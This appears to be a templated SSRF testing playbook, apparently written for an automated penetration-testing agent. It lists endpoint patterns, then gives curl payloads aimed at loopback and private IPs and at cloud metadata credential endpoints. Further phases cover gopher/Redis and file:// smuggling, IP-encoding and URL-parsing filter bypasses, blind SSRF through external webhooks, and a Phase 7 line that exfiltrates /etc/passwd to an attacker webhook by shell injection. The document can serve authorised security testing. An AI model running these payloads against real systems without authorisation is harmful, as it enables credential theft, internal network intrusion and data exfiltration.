<systematic_approach>

## Phase 1: Identify SSRF-Prone Endpoints

From discovery, flag endpoints with:
- URL parameters: `?url=`, `?redirect=`, `?callback=`, `?webhook=`
- Body fields: `image_url`, `avatar_url`, `source`, `remote`
- File import: `/api/import`, `/api/pdf-export`, `/api/screenshot`
- Proxy patterns: `/api/fetch`, `/api/proxy`

## Phase 2: Basic SSRF Tests

For each candidate:
```bash
# External URL (baseline)
curl -X POST {{WEB_URL}}/api/fetch -d '{"url":"http://webhook.site/<your-id>"}'

# Internal loopback
curl -X POST {{WEB_URL}}/api/fetch -d '{"url":"http://127.0.0.1/"}'
curl -X POST {{WEB_URL}}/api/fetch -d '{"url":"http://localhost:80/"}'

# Private ranges
curl -X POST {{WEB_URL}}/api/fetch -d '{"url":"http://10.0.0.1/"}'
curl -X POST {{WEB_URL}}/api/fetch -d '{"url":"http://192.168.1.1/"}'
curl -X POST {{WEB_URL}}/api/fetch -d '{"url":"http://169.254.169.254/"}'
```

Compare response sizes/status. If internal URL returns different data → SSRF confirmed.

## Phase 3: Cloud Metadata Endpoints

Test cloud provider metadata services (goldmine for cred theft):
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google`)
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true`)
- DigitalOcean: `http://169.254.169.254/metadata/v1/`

## Phase 4: Protocol Smuggling

- `file:///etc/passwd` — read local files
- `gopher://127.0.0.1:6379/_SET%20foo%20bar` — Redis injection via Gopher
- `dict://127.0.0.1:11211/` — Memcached probing
- `ldap://127.0.0.1/` — LDAP probing

## Phase 5: DNS Rebinding & Filter Bypasses

If simple internal IPs are blocked, try:
- DNS rebinding: register domain with short TTL, resolve to public first, then internal
- Decimal IP: `http://2130706433/` (127.0.0.1)
- Octal IP: `http://0177.0.0.1/`
- IPv6: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`
- URL parsing: `http://evil.com@127.0.0.1/`, `http://127.0.0.1#@evil.com/`
- Unicode: `http://127。0。0。1/` (fullwidth period)

## Phase 6: Blind SSRF Detection

Use webhook.site or burp collaborator:
```bash
curl -X POST {{WEB_URL}}/api/webhook -d '{"url":"http://<your-webhook>.oast.fun/"}'
```
Check if the webhook received the request. Note User-Agent (may reveal backend framework).

## Phase 7: Out-of-Band Data Exfiltration

If blind SSRF confirmed, chain to data exfiltration:
- Request `http://<webhook>/?data=$(cat /etc/passwd)` via shell injection
- DNS-based: `http://<hostname>.<webhook>.oast.fun`
